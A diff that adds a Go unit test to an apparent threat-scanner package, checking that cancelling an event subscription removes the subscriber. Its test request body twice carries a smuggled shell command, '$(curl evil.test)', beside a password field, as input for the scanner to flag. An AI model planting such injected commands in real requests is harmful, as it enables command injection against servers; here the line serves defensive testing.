@@ -160,6 +160,56 @@ func TestScannerDisabledAllows(t *testing.T) {
 	}
 }
 
+func TestScannerSubscribeCancelRemovesSubscriber(t *testing.T) {
+	cfg := &cfgpkg.Config{}
+	cfg.ThreatScanner.Enabled = true
+	cfg.ThreatScanner.Mode = "suspicious_only"
+	cfg.ThreatScanner.Provider = "none"
+	cfg.ThreatScanner.ScanRequests = true
+	cfg.ThreatScanner.BlockThreshold = 0.85
+	cfg.ThreatScanner.WarnThreshold = 0.65
+	cfg.ThreatScanner.RequireAIConfirm = false
+
+	manager := NewManager(func() *cfgpkg.Config { return cfg })
+	ch, cancel := manager.Subscribe()
+	if _, err := manager.ScanRequest(context.Background(), ScanInput{
+		Method:     "POST",
+		URL:        "http://10.0.0.5/login",
+		Host:       "10.0.0.5",
+		BodySample: []byte(`password=secret&cmd=$(curl evil.test)`),
+	}); err != nil {
+		t.Fatalf("ScanRequest returned error: %v", err)
+	}
+	select {
+	case <-ch:
+	default:
+		t.Fatal("expected initial threat event")
+	}
+
+	cancel()
+	cancel()
+	manager.mu.RLock()
+	subscriberCount := len(manager.subscribers)
+	manager.mu.RUnlock()
+	if subscriberCount != 0 {
+		t.Fatalf("expected subscriber to be removed, got %d", subscriberCount)
+	}
+
+	if _, err := manager.ScanRequest(context.Background(), ScanInput{
+		Method:     "POST",
+		URL:        "http://10.0.0.6/login",
+		Host:       "10.0.0.6",
+		BodySample: []byte(`password=secret&cmd=$(curl evil.test)`),
+	}); err != nil {
+		t.Fatalf("ScanRequest returned error: %v", err)
+	}
+	select {
+	case event := <-ch:
+		t.Fatalf("received event after cancel: %+v", event)
+	default:
+	}
+}
+
 func TestRedactionRemovesCommonSecrets(t *testing.T) {
 	body := []byte(`{"email":"dev@example.com","token":"eyJabc.def.ghi","password":"supersecret123","card":"4111 1111 1111 1111"}`)
 	redacted := string(RedactBody(body))
